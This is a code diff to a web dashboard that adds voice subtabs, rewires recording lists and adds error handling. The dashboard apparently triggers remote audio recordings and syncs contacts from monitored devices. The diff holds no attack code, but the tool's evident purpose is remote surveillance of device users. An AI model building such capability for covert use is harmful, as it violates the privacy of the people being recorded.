@@ -87,6 +87,9 @@ button#loadHistoryBtn{padding:5px 7px;font-size:13px;min-height:30px;min-width:3
 .tab-btn{padding:10px 16px;font-size:13px;border:none;background:none;color:var(--muted);cursor:pointer;white-space:nowrap;border-bottom:2px solid transparent;transition:.15s}
 .tab-btn.active{color:var(--accent);border-bottom-color:var(--accent)}
 .tab-btn:hover{color:var(--text)}
+.subtab-btn{padding:6px 14px;font-size:12px;border:1px solid var(--border);background:var(--card);color:var(--muted);cursor:pointer;border-radius:6px;transition:.15s}
+.subtab-btn.active{background:var(--accent);color:#000;border-color:var(--accent);font-weight:500}
+.subtab-btn:hover{color:var(--text)}
 .content{padding:12px;max-height:50vh;overflow-y:auto}
 .content>div{display:none}
 .content>div.active{display:block}
@@ -428,6 +431,12 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 <div id="contactsList"><div class="label">No contacts synced yet</div></div>
 </div>
 <div id="tab-voice">
+<div class="subtab-nav" style="display:flex;gap:4px;margin-bottom:12px">
+  <button class="subtab-btn active" data-subtab="voice-remote" onclick="switchVoiceSubtab('voice-remote')">🎙️ Remote Recordings</button>
+  <button class="subtab-btn" data-subtab="voice-notes" onclick="switchVoiceSubtab('voice-notes')">🎤 Voice Notes</button>
+</div>
+
+<div id="voice-sub-remote" class="voice-subtab">
 <div class="voice-record-panel" style="background:var(--card);padding:12px;border-radius:var(--radius);margin-bottom:12px;border:1px solid var(--border)">
 <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin-bottom:8px">
 <span style="font-size:13px;font-weight:500;color:var(--text)">🎙️ Remote Recording</span>
@@ -460,18 +469,17 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 </div>
 
 <div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:12px;padding-top:8px;border-top:1px solid var(--border)">
-  <button class="chip" style="background:var(--card);color:var(--text);border-color:var(--border)" onclick="cleanupOldRecordings(7)">
-    🗑 Cleanup recordings older than 7 days
-  </button>
-  <button class="chip" style="background:var(--card);color:var(--text);border-color:var(--border)" onclick="cleanupOldRecordings(30)">
-    🗑 Cleanup recordings older than 30 days
-  </button>
-  <button class="chip" style="background:var(--card);color:var(--text);border-color:var(--border)" onclick="cleanupOldRecordings(1)">
-    🗑 Cleanup recordings older than 1 day
-  </button>
+  <button class="chip" style="background:var(--card);color:var(--text);border-color:var(--border)" onclick="cleanupOldRecordings(7)">🗑 Cleanup recordings older than 7 days</button>
+  <button class="chip" style="background:var(--card);color:var(--text);border-color:var(--border)" onclick="cleanupOldRecordings(30)">🗑 Cleanup recordings older than 30 days</button>
+  <button class="chip" style="background:var(--card);color:var(--text);border-color:var(--border)" onclick="cleanupOldRecordings(1)">🗑 Cleanup recordings older than 1 day</button>
 </div>
 </div>
 <div id="voiceNotesList"><div class="label">No recordings yet</div></div>
+</div>
+
+<div id="voice-sub-notes" class="voice-subtab" style="display:none">
+<div id="voiceNotesSubList"><div class="label">Loading voice notes...</div></div>
+</div>
 </div>
 <div id="tab-insights">
 <div class="grid" style="grid-template-columns:1fr 1fr 1fr;margin-bottom:10px">
@@ -2184,7 +2192,8 @@ async function pollRecordings() {
 }
 async function pollVoiceNotes() {
   if (!selectedDevice) return;
-  const list = document.getElementById('voiceNotesList');
+  const list = document.getElementById('voiceNotesSubList');
+  if (!list) return;
   let data = await fetchRTDB(`devices/${selectedDevice}/voice_notes`);
   if (!data || typeof data !== 'object') {
     list.innerHTML = '<div class="label">No voice notes yet</div>';
@@ -3512,8 +3521,13 @@ async function pollRecordingProgress(requestId, durationSec) {
       
       if (elapsed >= durationSec + 5) {
         // Recording should be done, fetch new recordings
-        await fetchRecordings();
+        try {
+          await fetchRecordings();
+        } catch (e) {
+          console.error('Failed to fetch recordings after recording:', e);
+        }
         resetRecordingUI();
+        pollRecordings();
         return;
       }
       
@@ -3537,6 +3551,14 @@ function resetRecordingUI() {
   progress.style.display = 'none';
   cancelDiv.style.display = 'none';
   currentRecordingId = null;
+}
+
+function switchVoiceSubtab(subtab) {
+  document.querySelectorAll('#tab-voice .subtab-btn').forEach(b => b.classList.remove('active'));
+  document.querySelectorAll('#tab-voice .voice-subtab').forEach(d => d.style.display = 'none');
+  document.querySelector(`#tab-voice .subtab-btn[data-subtab="${subtab}"]`).classList.add('active');
+  document.getElementById(`voice-sub-${subtab.replace('voice-', '')}`).style.display = '';
+  if (subtab === 'voice-notes') pollVoiceNotes();
 }
 
 async function cleanupOldRecordings(days) {
@@ -3565,7 +3587,8 @@ async function cleanupOldRecordings(days) {
 
 async function fetchRecordings() {
   if (!recordingDevice) return;
-  const list = document.getElementById('recordingsList');
+  const list = document.getElementById('voiceNotesList');
+  if (!list) return;
   list.innerHTML = '<div class="label">Loading...</div>';
   
   try {
